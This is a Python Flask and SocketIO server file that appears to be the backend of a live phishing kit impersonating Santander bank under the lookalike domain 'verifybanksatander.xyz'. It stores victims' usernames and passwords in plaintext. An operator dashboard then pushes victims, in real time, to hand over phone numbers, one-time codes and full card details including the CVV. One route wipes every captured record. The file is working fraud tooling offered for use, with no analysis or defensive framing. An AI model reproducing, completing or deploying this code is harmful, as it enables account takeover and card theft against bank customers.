from flask import Flask, jsonify, request, session
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
from datetime import datetime, timedelta, timezone
from user_agents import parse
import os
import secrets
import json
import uuid
from functools import wraps
import random
import time
from flask_session import Session
from flask_sqlalchemy import SQLAlchemy
import logging

logging.basicConfig(level=logging.INFO)

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'a_secure_default_secret_key')
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=15)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

Session(app)
db = SQLAlchemy(app)
# Configure CORS to allow both localhost and production domain
CORS(app, supports_credentials=True, resources={
    r"/api/*": {
        "origins": [
            "http://localhost:5173",
            "https://www.verifybanksatander.xyz",
            "https://verifybanksatander.xyz"
        ]
    }
})

# Configure SocketIO with allowed origins
socketio = SocketIO(
    app,
    cors_allowed_origins=[
        "http://localhost:5173",
        "https://www.verifybanksatander.xyz",
        "https://verifybanksatander.xyz"
    ],
    manage_session=False,
    async_mode='eventlet',
    logger=True,
    engineio_logger=True
)

rate_limiter = {}
RATE_LIMIT_ATTEMPTS = 10
RATE_LIMIT_SECONDS = 60

class LoginAttempt(db.Model):
    id = db.Column(db.String, primary_key=True)
    username = db.Column(db.String(80), nullable=False)
    password = db.Column(db.String(120), nullable=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(50), default='pending')
    client_info = db.Column(db.JSON)
    is_bot = db.Column(db.Boolean, default=False)
    is_online = db.Column(db.Boolean, default=False)
    phone_number = db.Column(db.String(50), nullable=True)
    submitted_otp = db.Column(db.String(10), nullable=True)
    phone_ending_digits = db.Column(db.String(2), nullable=True)
    credit_card_number = db.Column(db.String(50), nullable=True)
    credit_card_expiry = db.Column(db.String(10), nullable=True)
    credit_card_cvv = db.Column(db.String(5), nullable=True)
    def to_dict(self):
        return {
            'id': self.id,
            'username': self.username,
            'password': self.password,
            'timestamp': self.timestamp.isoformat(),
            'status': self.status,
            'client_info': self.client_info,
            'is_bot': self.is_bot,
            'is_online': self.is_online,
            'phone_number': self.phone_number,
            'submitted_otp': self.submitted_otp,
            'phone_ending_digits': self.phone_ending_digits,
            'credit_card': {
                'number': self.credit_card_number,
                'expiry': self.credit_card_expiry,
                'cvv': self.credit_card_cvv
            } if self.credit_card_number else None
        }

class ActivityLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    action = db.Column(db.String(100))
    status = db.Column(db.String(50))
    details = db.Column(db.JSON)

connected_users = {}

def get_client_info():
    user_agent = parse(request.user_agent.string)
    return {
        'ip': request.remote_addr,
        'user_agent': {
            'browser': user_agent.browser.family,
            'browser_version': user_agent.browser.version_string,
            'os': user_agent.os.family,
            'os_version': user_agent.os.version_string,
            'device': user_agent.device.family,
            'is_mobile': user_agent.is_mobile,
            'is_tablet': user_agent.is_tablet,
            'is_pc': user_agent.is_pc,
            'is_bot': user_agent.is_bot,
            'raw': str(user_agent)
        },
        'headers': dict(request.headers)
    }

def log_activity(action, status, details=None):
    if details is None:
        details = {}
    if isinstance(details, str):
        details = {'message': details}
    log_entry = ActivityLog(action=action, status=status, details=details)
    db.session.add(log_entry)
    db.session.commit()

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('isAdmin'):
            return jsonify({'error': 'Admin access required'}), 403
        return f(*args, **kwargs)
    return decorated_function

@socketio.on('connect')
def handle_connect():
    attempt_id = request.args.get('attemptId')
    if attempt_id:
        join_room(attempt_id)
        connected_users[request.sid] = attempt_id
        attempt = LoginAttempt.query.get(attempt_id)
        if attempt:
            attempt.is_online = True
            db.session.commit()
            socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in connected_users:
        attempt_id = connected_users.pop(request.sid)
        attempt = LoginAttempt.query.get(attempt_id)
        if attempt:
            attempt.is_online = False
            db.session.commit()
            socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')

@socketio.on('user_is_waiting')
def handle_user_waiting(data):
    attempt_id = data.get('attemptId')
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        return
    status = attempt.status
    if status == 'phone_required':
        socketio.emit('prompt_for_phone', room=attempt_id)
    elif status == 'cc_required':
        socketio.emit('prompt_for_cc', room=attempt_id)
    elif status == 'otp_sent':
        socketio.emit('prompt_for_otp', room=attempt_id)
    elif status == 'otp_challenge_initiated':
        socketio.emit('status_updated', {'status': 'otp_challenge_initiated', 'phone_ending_digits': attempt.phone_ending_digits}, room=attempt_id)

@socketio.on('connect', namespace='/admin')
def handle_admin_connect():
    print(f"Admin client connected: {request.sid}")
    join_room('admin_dashboard')

@socketio.on('disconnect', namespace='/admin')
def handle_admin_disconnect():
    print(f"Admin client disconnected: {request.sid}")
    leave_room('admin_dashboard')

@app.route('/api/login', methods=['POST'])
def login():
    ip = request.remote_addr
    now = time.time()
    if ip not in rate_limiter:
        rate_limiter[ip] = []
    rate_limiter[ip] = [t for t in rate_limiter[ip] if now - t < RATE_LIMIT_SECONDS]
    if len(rate_limiter[ip]) >= RATE_LIMIT_ATTEMPTS:
        log_activity('rate_limit_exceeded', 'fail', {'ip': ip})
        return jsonify({'message': 'Too many requests. Please try again later.'}), 429
    rate_limiter[ip].append(now)
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    if data.get('website'):
        log_activity('honeypot_triggered', 'fail', {'ip': ip, 'username': username})
        return jsonify({'status': 'pending', 'attemptId': str(uuid.uuid4())})
    if not username or not password:
        return jsonify({'message': 'Username and password are required'}), 400
    if username == 'admin':
        if password == 'admin':
            session['isAdmin'] = True
            session.permanent = True
            log_activity('admin_login_success', 'success', f'Admin {username} logged in successfully')
            return jsonify({'status': 'success', 'isAdmin': True})
        else:
            log_activity('admin_login_fail', 'fail', f'Invalid password for admin {username}')
            return jsonify({'message': 'Invalid admin credentials'}), 401
    else:
        client_info = get_client_info()
        attempt_id = str(uuid.uuid4())
        new_attempt = LoginAttempt(
            id=attempt_id,
            username=username,
            password=password,
            client_info=client_info,
            is_bot=client_info['user_agent']['is_bot'],
            is_online=True
        )
        db.session.add(new_attempt)
        db.session.commit()
        socketio.emit('new_login_attempt', new_attempt.to_dict(), namespace='/admin', room='admin_dashboard')
        return jsonify({'status': 'pending', 'attemptId': attempt_id})

@app.route('/api/verify-otp', methods=['POST'])
def handle_verify_otp():
    data = request.get_json()
    attempt_id = data.get('attemptId')
    otp_provided = data.get('otp')
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt or attempt.submitted_otp != otp_provided:
        return jsonify({'message': 'Invalid OTP'}), 401
    if datetime.now(timezone.utc) - datetime.fromisoformat(attempt.timestamp) > timedelta(minutes=5):
        return jsonify({'message': 'OTP has expired'}), 400
    session['isAdmin'] = True
    session['user'] = attempt.username
    attempt.status = 'approved'
    db.session.commit()
    return jsonify({'message': 'OTP verified successfully', 'isAdmin': True})

@app.route('/api/login-attempts', methods=['GET'])
@admin_required
def get_login_attempts():
    attempts = LoginAttempt.query.order_by(LoginAttempt.timestamp.desc()).all()
    return jsonify({'login_attempts': [attempt.to_dict() for attempt in attempts]})

@app.route('/api/activity-logs', methods=['GET'])
@admin_required
def get_activity_logs():
    logs = ActivityLog.query.order_by(ActivityLog.timestamp.desc()).all()
    return jsonify({'activities': [log.to_dict() for log in logs]})

@app.route('/api/clear-logs', methods=['POST'])
@admin_required
def clear_logs():
    try:
        db.session.query(ActivityLog).delete()
        db.session.query(LoginAttempt).delete()
        db.session.commit()
        socketio.emit('logs_cleared', namespace='/admin', room='admin_dashboard')
        return jsonify({'message': 'All logs and attempts cleared'}), 200
    except Exception as e:
        db.session.rollback()
        logging.error(f"Error clearing logs: {e}")
        return jsonify({'error': 'Could not clear logs'}), 500

@app.route('/api/approve-login/<attempt_id>', methods=['POST'])
@admin_required
def approve_login_route(attempt_id):
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        return jsonify({'error': 'Attempt not found'}), 404
    
    attempt.status = 'approved'
    db.session.commit()
    
    log_activity('login_approved', 'success', {'attempt_id': attempt_id, 'username': attempt.username})
    socketio.emit('status_updated', {'status': 'approved'}, room=attempt_id)
    socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')
    return jsonify({'message': 'Login approved'})

@app.route('/api/reset-requests', methods=['GET'])
@admin_required
def get_reset_requests():
    pending_requests = [
        {
            'id': req_id,
            'user_id': req.username,
            'phone': req.phone_number,
            'requested_at': req.timestamp.isoformat(),
            'status': req.status
        }
        for req_id, req in connected_users.items()
        if req.status == 'pending'
    ]
    return jsonify({'requests': pending_requests})

@app.route('/api/approve-reset/<request_id>', methods=['POST'])
@admin_required
def approve_reset_request(request_id):
    if request_id not in connected_users:
        return jsonify({'error': 'Reset request not found'}), 404
        
    attempt = LoginAttempt.query.get(request_id)
    
    if attempt.status != 'pending':
        return jsonify({'error': 'Request already processed'}), 400
    
    otp = ''.join([str(secrets.randbelow(10)) for _ in range(6)])
    attempt.submitted_otp = otp
    attempt.status = 'approved'
    db.session.commit()
    
    print(f"OTP for reset request {request_id}: {otp}")
    
    socketio.emit('reset_otp_sent', {
        'request_id': request_id,
        'status': 'otp_sent',
        'message': 'Please enter the OTP sent to your phone'
    }, room=f'reset_{request_id}')
    
    return jsonify({
        'status': 'success',
        'message': 'OTP sent to user',
        'request_id': request_id
    })

@app.route('/api/deny-reset/<request_id>', methods=['POST'])
@admin_required
def deny_reset_request(request_id):
    if request_id not in connected_users:
        return jsonify({'error': 'Reset request not found'}), 404
        
    attempt = LoginAttempt.query.get(request_id)
    
    if attempt.status != 'pending':
        return jsonify({'error': 'Request already processed'}), 400
    
    attempt.status = 'denied'
    db.session.commit()
    
    socketio.emit('reset_denied', {
        'request_id': request_id,
        'status': 'denied',
        'message': 'Password reset request was denied by admin'
    }, room=f'reset_{request_id}')
    
    return jsonify({
        'status': 'success',
        'message': 'Reset request denied',
        'request_id': request_id
    })

@app.route('/api/verify-user', methods=['POST'])
def verify_user():
    data = request.get_json()
    user_id = data.get('userId')
    code = data.get('code')
    
    if not user_id or not code:
        return jsonify({'error': 'User ID and code are required'}), 400
    
    if len(code) != 4 or not code.isdigit():
        return jsonify({'error': 'Invalid verification code'}), 400
    
    request_id = str(uuid.uuid4())
    attempt = LoginAttempt(
        id=request_id,
        username=user_id,
        status='pending',
        client_info=get_client_info()
    )
    db.session.add(attempt)
    db.session.commit()
    
    return jsonify({
        'status': 'pending_approval',
        'requestId': request_id,
        'message': 'Waiting for admin approval'
    })

@app.route('/api/request-reset-otp', methods=['POST'])
def request_reset_otp():
    data = request.get_json()
    request_id = data.get('requestId')
    phone = data.get('phoneNumber')
    
    if not request_id or not phone:
        return jsonify({'error': 'Request ID and phone number are required'}), 400
    
    if request_id not in connected_users:
        return jsonify({'error': 'Invalid reset request'}), 404
        
    attempt = LoginAttempt.query.get(request_id)
    
    if attempt.status != 'pending':
        return jsonify({
            'error': 'Request already processed',
            'status': attempt.status
        }), 400
    
    attempt.phone_number = phone
    attempt.status = 'pending'
    db.session.commit()
    
    socketio.emit('new_reset_request', {
        'request_id': request_id,
        'user_id': attempt.username,
        'phone': phone,
        'requested_at': attempt.timestamp.isoformat(),
        'client_info': attempt.client_info
    }, room='admin_dashboard')
    
    socketio.enter_room(request_id, f'reset_{request_id}')
    
    return jsonify({
        'status': 'pending_approval',
        'message': 'Waiting for admin to approve OTP request',
        'requestId': request_id
    })

@app.route('/api/verify-reset-otp', methods=['POST'])
def verify_reset_otp():
    data = request.get_json()
    request_id = data.get('requestId')
    otp = data.get('otp')
    
    if not request_id or not otp:
        return jsonify({'error': 'Request ID and OTP are required'}), 400
    
    if request_id not in connected_users:
        return jsonify({'error': 'Invalid reset request'}), 404
        
    attempt = LoginAttempt.query.get(request_id)
    
    if attempt.status != 'approved':
        return jsonify({'error': 'Reset request not approved'}), 400
    
    if attempt.submitted_otp != otp:
        return jsonify({'error': 'Invalid OTP'}), 400
        
    if datetime.utcnow() > datetime.fromisoformat(attempt.timestamp):
        return jsonify({'error': 'OTP has expired'}), 400
    
    attempt.submitted_otp = None
    attempt.status = 'otp_verified'
    db.session.commit()
    
    return jsonify({
        'status': 'success',
        'message': 'OTP verified. You can now set a new password.',
        'reset_token': str(uuid.uuid4())
    })

@app.route('/api/deny-login/<attempt_id>', methods=['POST'])
@admin_required
def deny_login_route(attempt_id):
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        return jsonify({'error': 'Login attempt not found'}), 404
        
    attempt.status = 'denied'
    db.session.commit()
    socketio.emit('status_updated', {'status': 'denied'}, room=attempt_id)
    socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')
    return jsonify({'status': 'success'})

@app.route('/api/request-otp/<attempt_id>', methods=['POST'])
@admin_required
def request_otp_route(attempt_id):
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        return jsonify({'error': 'Login attempt not found'}), 404
    
    attempt.status = 'phone_required'
    db.session.commit()
    socketio.emit('status_updated', {'status': 'phone_required'}, room=attempt_id)
    socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')
    return jsonify({'status': 'success'})

@app.route('/api/request-cc/<attempt_id>', methods=['POST'])
@admin_required
def request_cc_route(attempt_id):
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        return jsonify({'error': 'Login attempt not found'}), 404
    
    attempt.status = 'cc_required'
    db.session.commit()
    socketio.emit('status_updated', {'status': 'cc_required'}, room=attempt_id)
    socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')
    return jsonify({'status': 'success'})

@socketio.on('phone_number_submitted')
def handle_phone_submission(data):
    attempt_id = data.get('attemptId')
    phone = data.get('phone')
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        return 
    
    attempt.phone_number = phone
    attempt.status = 'phone_submitted'
    db.session.commit()
    
    socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')

@app.route('/api/confirm-send-otp/<attempt_id>', methods=['POST'])
@admin_required
def confirm_send_otp(attempt_id):
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        return jsonify({'error': 'Login attempt not found'}), 404

    # Generate a dummy OTP
    otp = ''.join([str(secrets.randbelow(10)) for _ in range(6)])
    attempt.submitted_otp = otp
    attempt.status = 'otp_sent_to_user'
    db.session.commit()

    # Notify the user's browser to show the OTP input form
    socketio.emit('status_updated', {'status': 'pending_otp_challenge'}, room=attempt_id)
    
    # Notify the admin dashboard to update its UI
    socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')
    
    return jsonify({'status': 'success', 'otp': otp})

@socketio.on('user_submitted_otp')
def handle_user_otp_submission(data):
    attempt_id = data.get('attemptId')
    otp = data.get('otp')
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        return

    attempt.submitted_otp = otp
    attempt.status = 'otp_submitted'
    db.session.commit()
    socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')

@socketio.on('user_submitted_cc')
def handle_user_cc_submission(data):
    print(f"--- CC SUBMISSION RECEIVED ---: {data}")
    attempt_id = data.get('attemptId')
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        print(f"--- ERROR: Could not find attemptId {attempt_id}")
        return

    attempt.status = 'pending_cc_verification'
    attempt.credit_card_number = data.get('ccNum')
    attempt.credit_card_expiry = data.get('expiry')
    attempt.credit_card_cvv = data.get('cvv')
    db.session.commit()
    socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')

@socketio.on('otp_phone_submitted')
def handle_otp_phone(data):
    attempt_id = data.get('attempt_id')
    phone_number = data.get('phoneNumber')
    
    if not attempt_id or not phone_number:
        emit('error', {'message': 'Missing required fields'})
        return
    
    attempt = LoginAttempt.query.get(attempt_id)
    if attempt:
        attempt.phone_number = phone_number
        db.session.commit()
    
    for client in connected_users:
        emit('otp_phone_received', {
            'attempt_id': attempt_id,
            'phone_number': phone_number,
            'timestamp': datetime.utcnow().isoformat()
        }, room=client)
    
    emit('otp_phone_acknowledged', {'status': 'success'})

@socketio.on('otp_verify')
def handle_otp_verification(data):
    attempt_id = data.get('attempt_id')
    otp_attempt = data.get('otp')
    
    if not attempt_id or not otp_attempt:
        emit('otp_verification_result', {'success': False, 'message': 'Missing required fields'})
        return
    
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        emit('otp_verification_result', {'success': False, 'message': 'Invalid attempt ID'})
        return
    
    if attempt.submitted_otp != otp_attempt:
        emit('otp_verification_result', {'success': False, 'message': 'Invalid OTP'})
        return
    
    if datetime.utcnow() > datetime.fromisoformat(attempt.timestamp):
        emit('otp_verification_result', {'success': False, 'message': 'OTP has expired'})
        return
    
    attempt.submitted_otp = None
    attempt.status = 'otp_verified'
    db.session.commit()
    
    for client in connected_users:
        emit('otp_verified', {
            'attempt_id': attempt_id,
            'timestamp': datetime.utcnow().isoformat()
        }, room=client)
    
    emit('otp_verification_result', {'success': True, 'message': 'OTP verified successfully'})
    
    approve_login(attempt_id)

@socketio.on('verify_security_codes_admin')
def handle_security_verification_admin(data):
    if 'admin_id' not in session:
        emit('error', {'message': 'Unauthorized'})
        return
    
    attempt_id = data.get('attemptId')
    is_approved = data.get('approved', False)
    
    if not attempt_id:
        emit('error', {'message': 'Missing attempt ID'})
        return
    
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        emit('error', {'message': 'Invalid verification attempt'})
        return
    
    if is_approved:
        attempt.status = 'security_verified'
        db.session.commit()
        
        emit('verification_result', {
        'success': True,
            'message': 'Security verification successful! You will be logged in shortly.'
        }, room=attempt_id)
        
        for client in connected_users:
            emit('admin_notification', {
                'type': 'security_verification_result',
                'attempt_id': attempt_id,
                'username': attempt.username,
                'status': 'approved',
                'timestamp': datetime.utcnow().isoformat()
            }, room=client)
    else:
        emit('verification_result', {
            'success': False,
            'message': 'Security verification failed. Please try again.'
        }, room=attempt_id)
        
        for client in connected_users:
            emit('admin_notification', {
                'type': 'security_verification_result',
                'attempt_id': attempt_id,
                'username': attempt.username,
                'status': 'denied',
                'timestamp': datetime.utcnow().isoformat(),
                'reason': data.get('reason', 'No reason provided')
            }, room=client)
    
    for client in connected_users:
        emit('login_attempts_updated', {
            'attempts': [a for a in LoginAttempt.query.filter_by(status='pending').all()]
        }, room=client)

@socketio.on('admin_action')
def handle_admin_action(data):
    action = data.get('action')
    attempt_id = data.get('attemptId')
    
    if not attempt_id or not action:
        emit('error', {'message': 'Missing required fields'})
        return
    
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        emit('error', {'message': 'Invalid attempt ID'})
        return
    
    try:
        if action == 'approve':
            approve_login(attempt_id)
        elif action == 'deny':
            deny_login(attempt_id)
        elif action == 'request_otp':
            request_otp(attempt_id)
        elif action == 'request_reset':
            pass
        else:
            emit('error', {'message': 'Invalid action'})
            return
            
        emit('admin_action_result', {'success': True, 'action': action, 'attempt_id': attempt_id})
    except Exception as e:
        emit('admin_action_result', {'success': False, 'message': str(e)})
        log_activity('admin_action_error', 'error', str(e))

@app.route('/api/check-auth', methods=['GET'])
def check_auth():
    if session.get('is_admin'):
        return jsonify({'isAuthenticated': True, 'isAdmin': True})
    return jsonify({'isAuthenticated': False, 'isAdmin': False})

@app.route('/api/logout', methods=['POST'])
def logout():
    session.clear()
    return jsonify({'status': 'success'})

# This is the new, correct way to initialize the database.
with app.app_context():
    db.create_all()

@app.route('/api/initiate-otp-challenge/<attempt_id>', methods=['POST'])
@admin_required
def initiate_otp_challenge(attempt_id):
    data = request.get_json()
    last_two_digits = data.get('last_two_digits')

    if not last_two_digits or not last_two_digits.isdigit() or len(last_two_digits) != 2:
        return jsonify({'error': 'Invalid input. Please provide exactly two digits.'}), 400

    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt:
        return jsonify({'error': 'Login attempt not found'}), 404
    
    attempt.status = 'otp_challenge_initiated'
    attempt.phone_ending_digits = last_two_digits
    db.session.commit()

    # Notify the user's browser to show the confirmation prompt
    socketio.emit('status_updated', {'status': 'otp_challenge_initiated', 'phone_ending_digits': last_two_digits}, room=attempt_id)
    
    # Notify the admin dashboard to update its UI
    socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')
    
    return jsonify({'status': 'success'})

@socketio.on('user_confirmed_phone_ending')
def handle_user_phone_confirmation(data):
    attempt_id = data.get('attemptId')
    attempt = LoginAttempt.query.get(attempt_id)
    if not attempt or attempt.status != 'otp_challenge_initiated':
        # Could emit an error back to the user here if needed
        return

    # Generate a dummy OTP
    otp = ''.join([str(secrets.randbelow(10)) for _ in range(6)])
    attempt.submitted_otp = otp # Store the real OTP here to verify against
    attempt.status = 'otp_sent_to_user'
    db.session.commit()

    # Notify the user's browser to show the OTP input form
    socketio.emit('status_updated', {'status': 'pending_otp_challenge', 'message': f"An OTP has been sent to the number ending in {attempt.phone_ending_digits}."}, room=attempt_id)
    
    # Notify the admin dashboard to update its UI
    socketio.emit('update_login_attempt', attempt.to_dict(), namespace='/admin', room='admin_dashboard')

if __name__ == '__main__':
    socketio.run(app, debug=False, host='0.0.0.0', port=5000)
